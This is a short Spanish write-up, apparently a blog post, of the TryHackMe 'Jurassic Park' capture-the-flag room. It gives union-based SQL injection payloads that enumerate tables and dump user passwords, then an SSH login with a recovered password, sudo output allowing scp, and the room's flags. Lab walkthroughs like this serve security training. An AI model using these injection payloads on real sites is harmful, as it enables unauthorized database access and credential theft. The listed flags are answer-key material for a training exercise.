---
layout: post
title: JurasicPark -THM
subtitle: JurasicPark -THM
tags: [sqli]
---

## Puertos abiertos

```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

----

## Servicio web

### SQLi

Base de datos

```
http://10.10.110.137/item.php?id=5 union select 1,database(),3,4,5#
```

Numero de tablas de DDBB park

```
item.php?id=5 union select 1,2,3,count(*),5 FROM information_schema.tables WHERE table_schema="park"#
```

Tablas

```
item.php?id=5 union select 1,2,3,table_name,5 FROM information_schema.tables WHERE table_schema="park" LIMIT 1,1#
item.php?id=5 union select 1,2,3,table_name,5 FROM information_schema.tables WHERE table_schema="park" LIMIT 2,1#

items
users
```

Cantidad de columns de tabla items

```
item.php?id=5 union select 1,2,3,count(*),5 FROM information_schema.columns WHERE table_name="items" AND table_schema="park"#

5
```

Contraseña de Dennis

```
item.php?id=5 union select 1,2,3,group_concat(password),5 FROM park.users#

D0nt3ATM3,ih8dinos
```

----

Conexion ssh

```
ssh dennis@10.10.110.137
pass: ih8dinos
```

## Escalada de privilegios

```
dennis@ip-10-10-110-137:~$ sudo -l
Matching Defaults entries for dennis on ip-10-10-110-137.eu-west-1.compute.internal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dennis may run the following commands on ip-10-10-110-137.eu-west-1.compute.internal:
    (ALL) NOPASSWD: /usr/bin/scp
```

Flags:

```
flag1: b89f2d69c56b9981ac92dd267f
flag2: 96ccd6b429be8c9a4b501c7a0b117b0a
flag3: b4973bbc9053807856ec815db25fb3f1
flag5: 2a7074e491fcacc7eeba97808dc5e2ec
```
